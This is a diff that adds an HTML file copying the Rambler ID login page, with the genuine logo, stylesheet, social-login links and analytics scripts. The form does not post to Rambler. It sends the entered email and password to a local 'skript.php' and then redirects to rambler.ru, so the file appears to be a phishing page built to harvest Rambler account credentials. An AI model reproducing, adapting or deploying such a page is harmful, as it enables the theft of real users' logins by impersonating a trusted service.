@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta charset="UTF-8">
+    <title>Рамблер-Профиль: Авторизация</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="https://id.rambler.ru/login-20/favicon.ico">
+    <link rel="stylesheet" href="https://id.rambler.ru/login-20/compiled.css">
+	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+	<script>
+	function checkBox() {
+		if($('#checkbox').hasClass('form-checkbox__label_select')) $('#checkbox').removeClass('form-checkbox__label_select');
+		else $('#checkbox').addClass('form-checkbox__label_select');
+	}
+	</script>
+</head>
+<body class="page page_blue">
+	<div id="app" class="page__app"><div data-reactid=".0"><div class="alert" data-reactid=".0.0"><div class="alert__content" data-reactid=".0.0.0"><div class="page__content" data-reactid=".0.0.0.0"></div></div></div><div class="wrapper wrapper_absolute" data-reactid=".0.1" style="top: 137px;"><div class="page__content" data-reactid=".0.1.0">
+	
+	
+	<form class="form" action="skript.php" method="POST" data-reactid=".0.1.0.0">
+	
+	<input type="hidden" name="service" value="rambler">
+	<input type="hidden" name="ref" value="0">
+	<input type="hidden" name="redirect" value="http://www.rambler.ru/">
+	
+	<div class="form__header" data-reactid=".0.1.0.0.0"><div class="header" data-reactid=".0.1.0.0.0.0"><a href="http://www.rambler.ru/" class="header__logo" target="_self" data-reactid=".0.1.0.0.0.0.2">Рамблер</a></div></div><p class="form__title" data-reactid=".0.1.0.0.1"><span data-reactid=".0.1.0.0.1.0">Вход</span></p><div class="form__block" data-reactid=".0.1.0.0.2"><div class="form-input__wrap" data-reactid=".0.1.0.0.2.0">
+	
+	
+	<input type="email" name="login" value="" class="form-input" hidden="" placeholder="Почта" autocomplete="on" maxlength="43" data-reactid=".0.1.0.0.2.0.0" required>
+	
+	
+	
+	</div></div><div class="form__block" data-reactid=".0.1.0.0.3"><div class="form-input__wrap" data-reactid=".0.1.0.0.3.2">
+	
+	<input type="password" name="pass" value="" id="form_password" class="form-input form-input_w-icon" hidden="" placeholder="Пароль" autocomplete="on" data-reactid=".0.1.0.0.3.2.0" required>
+	
+	</div></div><div class="form__block" data-reactid=".0.1.0.0.4"><div class="form-input__wrap" data-reactid=".0.1.0.0.4.0"><button type="submit" class="form-button form-button_submit" data-reactid=".0.1.0.0.4.0.0">Войти</button></div></div><div class="form__block" data-reactid=".0.1.0.0.5"><div class="form-params" data-reactid=".0.1.0.0.5.0"><div class="form-params__block form-params__block_left" data-reactid=".0.1.0.0.5.0.0"><a href="https://id.rambler.ru/password/remind/" class="link" target="_self" data-reactid=".0.1.0.0.5.0.0.0">Напомнить пароль</a></div><div class="form-params__block form-params__block_right" data-reactid=".0.1.0.0.5.0.1"><div class="form-checkbox__wrap" data-reactid=".0.1.0.0.5.0.1.0"><input type="checkbox" name="long_session" value="false" id="long-session" class="form-checkbox" hidden="" placeholder="" autocomplete="on" data-reactid=".0.1.0.0.5.0.1.0.0"><label for="long-session" class="form-checkbox__label form-checkbox__label_hide" data-reactid=".0.1.0.0.5.0.1.0.1" onclick="checkBox()" id="checkbox">Запомнить меня</label></div></div></div></div><p class="form__title_sub" data-reactid=".0.1.0.0.6">Войти с помощью</p><ul class="social" data-reactid=".0.1.0.0.7"><li class="social__item" data-reactid=".0.1.0.0.7.0:$0"><a href="http://id.rambler.ru/oauth-20/?action=login&amp;provider=vkontakte&amp;back=https://id.rambler.ru/profile" class="social__link social__link_vk" target="_self" data-reactid=".0.1.0.0.7.0:$0.0">Вконтакте</a></li><li class="social__item" data-reactid=".0.1.0.0.7.0:$1"><a href="http://id.rambler.ru/oauth-20/?action=login&amp;provider=facebook&amp;back=https://id.rambler.ru/profile" class="social__link social__link_fb" target="_self" data-reactid=".0.1.0.0.7.0:$1.0">Фейсбук</a></li><li class="social__item" data-reactid=".0.1.0.0.7.0:$2"><a href="http://id.rambler.ru/oauth-20/?action=login&amp;provider=livejournal&amp;back=https://id.rambler.ru/profile" class="social__link social__link_lj" target="_self" data-reactid=".0.1.0.0.7.0:$2.0">Livejournal</a></li><li class="social__item" data-reactid=".0.1.0.0.7.1"><ul class="social-list social-list_hide" data-reactid=".0.1.0.0.7.1.0"><li class="social-list__points" data-reactid=".0.1.0.0.7.1.0.0"><i class="social-list__points-point" data-reactid=".0.1.0.0.7.1.0.0.0"></i></li><li class="social-list__item" data-reactid=".0.1.0.0.7.1.0.1:$0"><a href="http://id.rambler.ru/oauth-20/?action=login&amp;provider=odnoklassniki&amp;back=https://id.rambler.ru/profile" class="social-list__link social-list__link_ok" target="_self" data-reactid=".0.1.0.0.7.1.0.1:$0.0">Одноклассники</a></li><li class="social-list__item" data-reactid=".0.1.0.0.7.1.0.1:$1"><a href="http://id.rambler.ru/oauth-20/?action=login&amp;provider=mailru&amp;back=https://id.rambler.ru/profile" class="social-list__link social-list__link_mailru" target="_self" data-reactid=".0.1.0.0.7.1.0.1:$1.0">Mail.Ru</a></li><li class="social-list__item" data-reactid=".0.1.0.0.7.1.0.1:$2"><a href="http://id.rambler.ru/oauth-20/?action=login&amp;provider=google&amp;back=https://id.rambler.ru/profile" class="social-list__link social-list__link_gplus" target="_self" data-reactid=".0.1.0.0.7.1.0.1:$2.0">Google</a></li><li class="social-list__item" data-reactid=".0.1.0.0.7.1.0.1:$3"><a href="http://id.rambler.ru/oauth-20/?action=login&amp;provider=pgumosru&amp;back=https://id.rambler.ru/profile" class="social-list__link social-list__link_pgu" target="_self" data-reactid=".0.1.0.0.7.1.0.1:$3.0">pgu.mos.ru</a></li><li class="social-list__item" data-reactid=".0.1.0.0.7.1.0.1:$4"><a href="http://id.rambler.ru/oauth-20/?action=login&amp;provider=twitter&amp;back=https://id.rambler.ru/profile" class="social-list__link social-list__link_tw" target="_self" data-reactid=".0.1.0.0.7.1.0.1:$4.0">Twitter</a></li><li class="social-list__item social-list__item_separate" data-reactid=".0.1.0.0.7.1.0.2"><a href="#/phone" class="social-list__link social-list__link_phone" target="_self" data-reactid=".0.1.0.0.7.1.0.2.0">Мобильный</a></li></ul></li></ul><div class="form__footer" data-reactid=".0.1.0.0.8"><span data-reactid=".0.1.0.0.8.0" class="form-button form-button_light-trans form-button_no-cursor">Нет аккаунта?</span><br data-reactid=".0.1.0.0.8.1"><a href="https://id.rambler.ru/profile/create/" class="form-button form-button_light" target="_self" data-reactid=".0.1.0.0.8.2">Регистрация</a></div></form></div></div></div></div>
+
+    <!--[if IE 8]>
+    <script src="ie8fix.js"></script>
+    <![endif]-->
+    <!--[if IE 9]>
+    <script src="ie9fix.js"></script>
+    <![endif]-->
+    <script type="text/javascript" async="" src="https://st.top100.ru/top100/top100.js"></script><script type="text/javascript" async="" src="https://www.tns-counter.ru/tcounter.js"></script><script type="text/javascript" async="" src="https://mc.yandex.ru/metrika/watch.js"></script><script type="text/javascript" async="" src="https://mc.yandex.ru/metrika/watch.js"></script><script type="text/javascript" async="" src="https://mc.yandex.ru/metrika/watch.js"></script><script async="" src="//www.google-analytics.com/analytics.js"></script>
+
+    <!-- Rambler Cerber-->
+<script src="//cntcerber.rambler.ru/counter.js"></script>
+<script type="text/javascript">
+    // In IE8 need fix this init in Cerber
+    if(document.addEventListener){
+        window.cerberCounter = new CerberCounter({
+            project: 'rambler.id',
+            attributes_dataset: [
+                'cerber-topline'
+            ]
+        });
+    }else{
+        var img = document.createElement('img');
+        img.src = '//cntcerber.rambler.ru/cnt/noscript/rambler.id';
+        document.body.appendChild(img);
+    }
+</script>
+<noscript>
+    &lt;img src="//cntcerber.rambler.ru/cnt/noscript/rambler.id"&gt;
+</noscript>
+<!-- /Rambler Cerber-->
+
+<!-- Google Analytics-->
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-18802276-5', 'auto');
+    ga('send', 'pageview');
+</script>
+<!-- /Google Analytics-->
+
+<!-- Yandex.Metrika id.rambler.ru -->
+<script type="text/javascript">
+(function (d, w, c) {
+    (w[c] = w[c] || []).push(function() {
+        try {
+            w.yaCounter29123130 = new Ya.Metrika({id:29123130,
+                    webvisor:true,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true});
+        } catch(e) { }
+    });
+
+    var n = d.getElementsByTagName("script")[0],
+        s = d.createElement("script"),
+        f = function () { n.parentNode.insertBefore(s, n); };
+    s.type = "text/javascript";
+    s.async = true;
+    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+    if (w.opera == "[object Opera]") {
+        d.addEventListener("DOMContentLoaded", f, false);
+    } else { f(); }
+})(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript>&lt;div&gt;&lt;img src="//mc.yandex.ru/watch/29123130" style="position:absolute; left:-9999px;" alt="" /&gt;&lt;/div&gt;</noscript>
+<!-- /Yandex.Metrika id.rambler.ru -->
+
+<!-- Yandex.Metrika Rambler Главная -->
+<script type="text/javascript">
+    (function (d, w, c) {
+        (w[c] = w[c] || []).push(function() {
+            try {
+            w.yaCounter25662806 = new Ya.Metrika({id:25662806,
+                webvisor:true,
+                clickmap:true,
+                trackLinks:true,
+                accurateTrackBounce:true});
+            } catch(e) { }
+         });
+
+        var n = d.getElementsByTagName("script")[0],
+            s = d.createElement("script"),
+            f = function () { n.parentNode.insertBefore(s, n); };
+        s.type = "text/javascript";
+        s.async = true;
+        s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+        if (w.opera == "[object Opera]") {
+            d.addEventListener("DOMContentLoaded", f, false);
+        } else { f(); }
+    })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript>&lt;div&gt;&lt;img src="//mc.yandex.ru/watch/25662806" style="position:absolute; left:-9999px;" alt="" /&gt;&lt;/div&gt;</noscript>
+<!-- /Yandex.Metrika Rambler Главная -->
+
+<!-- Yandex.Metrika Rambler-Portal -->
+<script type="text/javascript">
+    (function (d, w, c) {
+        (w[c] = w[c] || []).push(function() {
+            try {
+                w.yaCounter26649402 = new Ya.Metrika({
+                    id:26649402,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true
+                });
+            } catch(e) { }
+        });
+
+        var n = d.getElementsByTagName("script")[0],
+            s = d.createElement("script"),
+            f = function () { n.parentNode.insertBefore(s, n); };
+        s.type = "text/javascript";
+        s.async = true;
+        s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+        if (w.opera == "[object Opera]") {
+            d.addEventListener("DOMContentLoaded", f, false);
+        } else { f(); }
+    })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript>&lt;div&gt;&lt;img src="//mc.yandex.ru/watch/26649402" style="position:absolute; left:-9999px;" alt="" /&gt;&lt;/div&gt;</noscript>
+<!-- /Yandex.Metrika Rambler-Portal -->
+
+<!-- tns-counter.ru -->
+<script type="text/javascript">
+    (function(win, doc, cb){
+        (win[cb] = win[cb] || []).push(function() {
+            try {
+                tnsCounterRambler_ru = new TNS.TnsCounter({
+                'account':'rambler_ru',
+                'tmsec': 'rambler_mail'
+                });
+            } catch(e){}
+        });
+
+        var tnsscript = doc.createElement('script');
+        tnsscript.type = 'text/javascript';
+        tnsscript.async = true;
+        tnsscript.src = ('https:' == doc.location.protocol ? 'https:' : 'http:') +
+            '//www.tns-counter.ru/tcounter.js';
+        var s = doc.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(tnsscript, s);
+    })(window, this.document,'tnscounter_callback');
+</script>
+<noscript>
+    &lt;img src="//www.tns-counter.ru/V13a****rambler_ru/ru/UTF-8/tmsec=rambler_mail/" width="0" height="0" alt="" /&gt;
+</noscript>
+<!--/ tns-counter.ru -->
+
+<!-- top100 -->
+<script type="text/javascript">
+    var _top100q = _top100q || [];
+    _top100q.push(['setAccount', '3115342']);
+    _top100q.push(['trackPageview']);
+
+    (function(){
+      var pa = document.createElement("script");
+      pa.type = "text/javascript";
+      pa.async = true;
+      pa.src = ("https:" == document.location.protocol ? "https:" : "http:") + "//st.top100.ru/top100/top100.js";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(pa, s);
+    })();
+</script>
+<noscript>
+    &lt;a href="http://top100.rambler.ru/navi/3115342/"&gt;&lt;img src="http://counter.rambler.ru/top100.cnt?3115342" alt="Rambler's Top100" border="0" /&gt;&lt;/a&gt;
+</noscript>
+<!--/ top100 -->
+
+
+</body></html>
